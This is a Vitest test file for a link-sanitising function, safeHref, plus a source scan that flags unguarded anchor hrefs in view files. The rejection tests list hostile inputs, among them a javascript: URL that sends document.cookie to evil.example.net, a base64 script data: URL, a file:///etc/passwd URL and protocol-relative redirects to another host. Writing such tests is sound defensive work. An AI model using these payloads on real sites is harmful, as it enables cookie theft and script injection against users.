import { readFileSync, readdirSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { safeHref } from '../view-model.js';

describe('what may become a link', () => {
  it('keeps an ordinary web address', () => {
    expect(safeHref('https://github.com/voyagi/bumpwarden/issues/1')).toBe(
      'https://github.com/voyagi/bumpwarden/issues/1',
    );
    expect(safeHref('http://osv.dev/vulnerability/GHSA-x')).toBe(
      'http://osv.dev/vulnerability/GHSA-x',
    );
  });

  it('keeps a path this site built, and refuses one pointing at another host', () => {
    expect(safeHref('/projects/voyagi%2Fdemo')).toBe('/projects/voyagi%2Fdemo');
    expect(safeHref('//evil.example.net/projects')).toBeNull();
    // A browser normalises the backslash to a slash before it resolves the url, so this is the
    // protocol-relative form again, spelled so that reading it does not look like one.
    expect(safeHref('/\\evil.example.net/projects')).toBeNull();
    expect(safeHref('/\\\\evil.example.net')).toBeNull();
  });

  /**
   * The claim source is written by the model, from release notes whoever published the package
   * wrote. A scheme that runs code on a click is the one thing that must not survive the trip.
   */
  it('refuses every scheme that executes or embeds rather than navigates', () => {
    for (const attempt of [
      'javascript:fetch("https://evil.example.net?c="+document.cookie)',
      'JaVaScRiPt:alert(1)',
      '  javascript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      'blob:https://bumpwarden.example.run/1',
    ]) {
      expect(safeHref(attempt), attempt).toBeNull();
    }
  });

  it('refuses an empty or unparseable value rather than emitting it', () => {
    expect(safeHref('')).toBeNull();
    expect(safeHref(null)).toBeNull();
    expect(safeHref(undefined)).toBeNull();
    expect(safeHref('not a url at all')).toBeNull();
  });
});

/**
 * The class, not the instance. A new page that writes `href={something}` of its own would reopen
 * exactly the hole `Linked` closes, and no runtime test covers a page nobody has written yet, so
 * the guard is on the source rather than on the output.
 */
describe('every href on every page', () => {
  const VIEWS = new URL('.', import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1');
  const ALLOWED =
    /^href=\{(?:safeHref\(|`|projectPath\(|bumpPath\(|filterHref\(|options\.canonical|item\.href|props\.action\.href)/;

  const files = readdirSync(VIEWS).filter((name) => name.endsWith('.tsx'));

  it('reads the view folder rather than an empty list', () => {
    expect(files.length).toBeGreaterThan(5);
  });

  it.each(files)('%s writes no anchor of its own outside Linked', (name) => {
    const text = readFileSync(`${VIEWS}${name}`, 'utf8');
    // Anchors only. A `href` prop handed to Linked is the guarded path by definition.
    const anchors = [...text.matchAll(/<a\b[^>]*?(href=\{[^}]*\})/g)].map(
      (match) => match[1] ?? '',
    );
    const unguarded = anchors.filter((href) => !ALLOWED.test(href));

    // link.tsx is the guard itself, so its own anchor is the one that may hold a checked value.
    expect(name === 'link.tsx' ? [] : unguarded).toEqual([]);
  });
});
